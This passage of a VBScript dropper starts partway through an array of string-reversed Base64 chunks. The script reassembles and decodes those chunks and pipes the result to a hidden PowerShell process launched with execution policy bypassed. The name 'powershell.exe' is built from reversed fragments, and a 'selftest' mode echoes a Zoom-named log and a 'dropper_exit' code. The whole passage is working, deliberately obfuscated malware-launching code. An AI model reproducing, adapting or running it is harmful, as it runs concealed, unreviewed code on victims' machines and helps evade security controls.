    "S5CcjRSXkl2b2tFIgACIgACIgoQD7BCdjVmai9ULoNWYFJ3b", _
    "K0QfgACIgoQDp8FJoQGZB5ycllGbi1WZzNXQkV2YuVmclZWZ", _
    "0Z2bz9mcjlWTgQ3YlpmYP1ydl5EI9AiclRWa29mcwRCIgACI", _
    "zVmckACIgAiCNIXZklmdvJHUlR2bDBnchh2UD5CcyFGaTNkL", _
    "T12byZUesJWblN3cBVGbpBXbvNkLyVGZpZ3byBHJg0DI0xWd", _
    "0xWdzVmckgCImlGIgACIK0QKlNmc192ckACLwNGJoU2YyV3b", _
    "4VGdkACIgACIgACIK0wegkCMgQ3ZtACduV3bD5ycy9mcyVkL", _
    "1NXZyRCIulGIlRCKgg2YhVmcvZGIgACIgACIgoQDncCI9ACd", _
    "gkCKn5WayR3UvRlLlRCI9sCI0hXZ0RCI7BSKzJ3byJXRuQHb", _
    "lRXaydlO60VZslmRu8USbBCIgACIgACIK0QfgIibgJHYiAyK", _
    "w1Sbv9menACUNVEV6YnblRCIoRXYQ1ibp9mSogCd4VGVsxWQ", _
    "phXZgACIgACIgAiCNkCd4VGdkACLpcyZvxmLsxWZoNncld3b", _
    "w12bD5CdsV3clJHJg0DIlBXe0RCIgACIK0QfgACIgoQDyACd", _
    "K0QKnIXZkF2bM12bvp1JoUGc5RFdldkL5xmYtV2czFEZlxWa", _
    "n4Wah10JoQ2boRXZNRXZH5SZwlHdkASPgQ2boRXZtRCIgACI", _
    "pBCIgAiCNUERP10XN90TapjduVGJg0DIlR2btRCIgACIK0QK", _
    "7BSKpUGZv1GJokHdw1WRy9EbsVnTzlkO601Zulmc0N3WoAiZ", _
    "nJXQlt2b25WakACIgAiCN0HInwGbhR3cul2Jg0DIlR2btRCI", _
    "ulGJgACIgoQDxAyJdtFdjVmai92JgQ3YlpmYP1ydl5EI9Ayc", _
    "gAiCNkSZk9WbkgCQd11Wn5WayR3cbBSPg0FMbN3ZyFUZr9md", _
    "25WakACLsxWduRCKlt2b25WSuQ2boRXZtRCI9ASZk92YkACI", _
    "0F2Yg0nCNUGZvNGJdRnbptFI0lGelBCIgAiCNkycnJXQlt2b", _
    "6oTXlxWaG5yTJtFIgACIgACIgoQD7BSeyRHIgACIK0wegg2Y", _
    "6dCIQ1URUpjduVGJggGdhBVLul2bKhCK0hXZUxGbBVGdpJ3V", _
    "pkCKn5WayR3UvRlLfRCIskyJn9GbuwGblh2cyV2dvBXLt92b", _
    "==QfK0QMgQXa4VGIgACIK0Qf7BCajRXYjBSfgACIgoQD" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & b64 & "'))|iex"""

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
